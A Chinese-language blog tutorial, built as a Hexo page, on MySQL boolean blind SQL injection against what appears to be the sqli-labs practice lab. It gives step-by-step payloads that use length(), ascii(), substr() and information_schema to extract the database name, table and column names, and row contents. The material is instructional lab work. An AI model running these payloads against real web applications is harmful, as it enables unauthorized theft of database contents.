@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="mysql布尔盲注">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql布尔盲注">
+<meta property="og:url" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="xf&#39;s blog">
+<meta property="og:description" content="mysql布尔盲注">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183622873.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183708458.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183738116.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183900946.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918184212227.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918185845522.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/e850352ac65c103880a07b53bc119313b17e8941.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918191448172.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918192215572.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918192408209.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919074451791.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919075059656.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919075325639.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919080158518.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919081342672.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919081653536.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919082207658.png">
+<meta property="article:published_time" content="2021-09-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-19T00:29:41.776Z">
+<meta property="article:author" content="xf">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183622873.png">
+
+
+<link rel="canonical" href="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","path":"2021/09/19/web安全/mysql布尔盲注/","title":"mysql布尔盲注"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>mysql布尔盲注 | xf's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?50383950ce261bfae047ef555de05e48"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">xf's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1%EF%BC%89%E6%9F%A5%E6%89%BE%E5%88%87%E5%85%A5%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">1）查找切入点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2%EF%BC%89%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">2）获取数据的方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3%EF%BC%89%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">3.</span> <span class="nav-text">3）获取数据库名</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="nav-number">3.1.</span> <span class="nav-text">1.获取数据库长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97"><span class="nav-number">3.2.</span> <span class="nav-text">2.获取数据库名字</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4%EF%BC%89%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="nav-number">4.</span> <span class="nav-text">4）获取表信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E8%A1%A8%E7%9A%84%E4%B8%AA%E6%95%B0"><span class="nav-number">4.1.</span> <span class="nav-text">1.获取表的个数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="nav-number">4.2.</span> <span class="nav-text">2.获取表名的长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-number">4.3.</span> <span class="nav-text">3.获取表名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5%EF%BC%89%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="nav-number">5.</span> <span class="nav-text">5）获取字段信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0"><span class="nav-number">5.1.</span> <span class="nav-text">1.获取字段个数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="nav-number">5.2.</span> <span class="nav-text">2.获取字段长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">5.3.</span> <span class="nav-text">3.获取字段名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6%EF%BC%89%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-number">6.</span> <span class="nav-text">6）获取数据</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%AA%E6%95%B0"><span class="nav-number">6.1.</span> <span class="nav-text">1.获取数据的个数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="nav-number">6.2.</span> <span class="nav-text">2.获取数据的长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">6.3.</span> <span class="nav-text">3.获取数据的内容</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xf"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">xf</p>
+  <div class="site-description" itemprop="description">xf@github.io</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="xf">
+      <meta itemprop="description" content="xf@github.io">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xf's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          mysql布尔盲注
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-09-19 00:00:00 / 修改时间：08:29:41" itemprop="dateCreated datePublished" datetime="2021-09-19T00:00:00+08:00">2021-09-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>mysql布尔盲注</p>
+<span id="more"></span>
+
+<h1 id="1）查找切入点"><a href="#1）查找切入点" class="headerlink" title="1）查找切入点"></a>1）查找切入点</h1><p>盲注的特点就在于什么都不知道，只能一个个试，猜出sql语句然后实现注入。</p>
+<p><code>?id=1</code>正常访问：</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183622873.png" class="">
+
+<p>尝试使用<code>?id=1 and 1=1</code>，发现有结果。</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183708458.png" class="">
+
+<p>尝试使用<code>?id=1 and 1=2</code>，发现仍然有结果</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183738116.png" class="">
+
+<p>这个时候我们就可以猜测到应该是有闭合问题，没有闭合，所以导致<code>and</code>后面条件为假还有回显。我们尝试<code>?id=1&#39;</code>，发现无显示结果！</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918183900946.png" class="">
+
+<p>可以猜测到sql语句出错了，那我们就尝试使用注释闭合并。发现能显示，那么方向一定就是对的。</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918184212227.png" class="">
+
+<p>尝试使用<code>?id=1&#39; and 1=1 --x</code>和<code>?id=1&#39; and 1=2 -- x</code>，观察结果发现，这确实就是切入点。</p>
+<h1 id="2）获取数据的方法"><a href="#2）获取数据的方法" class="headerlink" title="2）获取数据的方法"></a>2）获取数据的方法</h1><p>布尔盲注，在于一个布尔，我们只需要修改<code>and</code>后面的值，观察其返回结果即可。</p>
+<p>注入步骤：</p>
+<ol>
+<li>获取数据库名<ul>
+<li>获取数据库名字的长度</li>
+<li>截取获得数据库名字每一个字符</li>
+</ul>
+</li>
+<li>获取表的名称<ul>
+<li>获取表的个数</li>
+<li>获取对应表名的长度</li>
+<li>截取获取对应表名的每一个字符</li>
+</ul>
+</li>
+<li>获取字段名<ul>
+<li>获取字段的个数</li>
+<li>获取对应字段名的长度</li>
+<li>截取获取对应字段名的每一个字符</li>
+</ul>
+</li>
+<li>获取内容<ul>
+<li>获取内容的个数</li>
+<li>获取每一个内容的长度</li>
+<li>截取获取每一个内容的每一个字符</li>
+</ul>
+</li>
+</ol>
+<p>每个步骤都一样，所以只演示获取一个数据。</p>
+<p>首先要构建payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (对应语句) -- x</span></span><br></pre></td></tr></table></figure>
+
+<p>当语句结果不为<code>0</code>时那么就为<code>true</code>，这个时候就会显示结果，那我们注入的数据就是我们想要的信息。</p>
+<h1 id="3）获取数据库名"><a href="#3）获取数据库名" class="headerlink" title="3）获取数据库名"></a>3）获取数据库名</h1><h2 id="1-获取数据库长度"><a href="#1-获取数据库长度" class="headerlink" title="1.获取数据库长度"></a>1.获取数据库长度</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过length()函数获取对应字符串的长度</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918185845522.png" class="">
+
+<p>获取到数据库长度为<code>8</code></p>
+<h2 id="2-获取数据库名字"><a href="#2-获取数据库名字" class="headerlink" title="2.获取数据库名字"></a>2.获取数据库名字</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 我们一般都是用ascii()函数将对应的字符转换为ascii码，因为这样是数字，好比较并且也容易爆破</span></span><br><span class="line"><span class="comment">-- 通过substr()函数将数据进行截取，</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ascii</code>码表：</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/e850352ac65c103880a07b53bc119313b17e8941.png" class="">
+
+<p>函数解析：</p>
+<ul>
+<li><code>ascii(str)</code><ul>
+<li>此函数就只能有一个参数，类型为字符串</li>
+<li>它会将字符串的<strong>第一个字符</strong>转换为对应的<code>ascii</code>值</li>
+</ul>
+</li>
+<li><code>substr(str,pos,len)</code><ul>
+<li>此函数有多种<strong>重载(不懂可以百度)</strong><ul>
+<li>第一个参数为需要截取的字符串</li>
+<li>第二个参数为开始的位置，这个值从1开始，比如字符串<code>str</code>，第一个就是<code>s</code></li>
+<li>第三个参数为截取的长度<ul>
+<li>如果长度超过了可以截取的位置，那么就截取到末尾</li>
+<li>如果长度小于等于零，那么就为空字符串</li>
+<li>否则按要求获取</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>获取到第一个字符为：<code>s</code></p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918191448172.png" class="">
+
+<p>因为知道长度所以可以通过修改<code>substr</code>函数的第一个参数以及最后的<code>ascii</code>值，得到数据库名字为：<code>security</code></p>
+<h1 id="4）获取表信息"><a href="#4）获取表信息" class="headerlink" title="4）获取表信息"></a>4）获取表信息</h1><h2 id="1-获取表的个数"><a href="#1-获取表的个数" class="headerlink" title="1.获取表的个数"></a>1.获取表的个数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 首先获取表的个数</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=1 -- x</span></span><br></pre></td></tr></table></figure>
+
+<p>通过测试获取到表的个数为<code>4</code></p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918192215572.png" class="">
+
+<h2 id="2-获取表名的长度"><a href="#2-获取表名的长度" class="headerlink" title="2.获取表名的长度"></a>2.获取表名的长度</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过limit获取数据进行分页显示，然后获取长度进行比较</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1 -- x</span></span><br></pre></td></tr></table></figure>
+
+<p>由此<code>playload</code>可以得到第一个表名的长度</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210918192408209.png" class="">
+
+<p>操作符解析：</p>
+<ul>
+<li><code>limit index,len</code><ul>
+<li>有两种写法<ul>
+<li>截取从<code>index</code>开始的<code>len</code>条记录数</li>
+<li>第一个参数表示的是下标，从0开始，也就是0表示第一条数据</li>
+<li>第二个参数表示的是长度，需要获取的数据长度<ul>
+<li>如果<code>len</code>大于剩下的条数，那么就查询出来所有记录</li>
+<li>如果<code>len</code>等于0，那么将无法查出结果</li>
+<li>如果<code>len</code>小于0，那么将报错</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>写法2：<code>limit len</code><ul>
+<li>这种写法其实是<code>limit 0,len</code>的简写，用法一样</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>已经知道表的个数了，通过修改<code>limit</code>的<code>index</code>可以获取到其他表的信息。</p>
+<h2 id="3-获取表名"><a href="#3-获取表名" class="headerlink" title="3.获取表名"></a>3.获取表名</h2><p>既然我知道了每一个表的长度，那我可以使用<code>ascii+substr</code>截取获取每一位的值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919074451791.png" class="">
+
+<p>由此获取到第一位为<code>e</code>，同理可以获取到整个表名为：<code>emails</code>。其他表名获取方式同理。</p>
+<h1 id="5）获取字段信息"><a href="#5）获取字段信息" class="headerlink" title="5）获取字段信息"></a>5）获取字段信息</h1><p>我们知道了库名以及表名，获取字段信息就很容易了。</p>
+<h2 id="1-获取字段个数"><a href="#1-获取字段个数" class="headerlink" title="1.获取字段个数"></a>1.获取字段个数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload		0x656D61696C73 = emails</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x656D61696C73)=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919075059656.png" class="">
+
+<p>所以获取到有<code>2</code>个字段。</p>
+<h2 id="2-获取字段长度"><a href="#2-获取字段长度" class="headerlink" title="2.获取字段长度"></a>2.获取字段长度</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload	通过limit分页获取每个字段的长度</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x656D61696C73 limit 0,1)=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919075325639.png" class="">
+
+<p>可以获取到第一个字段长度为<code>2</code>个，同理可得另一个为<code>8</code>个</p>
+<h2 id="3-获取字段名"><a href="#3-获取字段名" class="headerlink" title="3.获取字段名"></a>3.获取字段名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload	通过substr+ascii 进行截取对比</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=database() and table_name=0x656D61696C73 limit 0,1)=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919080158518.png" class="">
+
+<p>获取到该表的第一个字段的第一个字符为<code>i</code>，同理可得第一个字段为<code>id</code>，第二个字段为<code>email_id</code></p>
+<h1 id="6）获取数据"><a href="#6）获取数据" class="headerlink" title="6）获取数据"></a>6）获取数据</h1><p>知道库名，表名，字段名，我们就可以获取到数据内容了。</p>
+<h2 id="1-获取数据的个数"><a href="#1-获取数据的个数" class="headerlink" title="1.获取数据的个数"></a>1.获取数据的个数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(*) from security.emails)=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919081342672.png" class="">
+
+<p>可以得知该库该表中有<code>8</code>条数据。</p>
+<h2 id="2-获取数据的长度"><a href="#2-获取数据的长度" class="headerlink" title="2.获取数据的长度"></a>2.获取数据的长度</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过length()函数获取对应字段内容的长度</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(id) from security.emails limit 0,1)=? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/image-20210919081653536.png" class="">
+
+<p>获取长度为<code>1</code>，同理可以获取第一条数据，第二个字段内容的长度：<code>16</code></p>
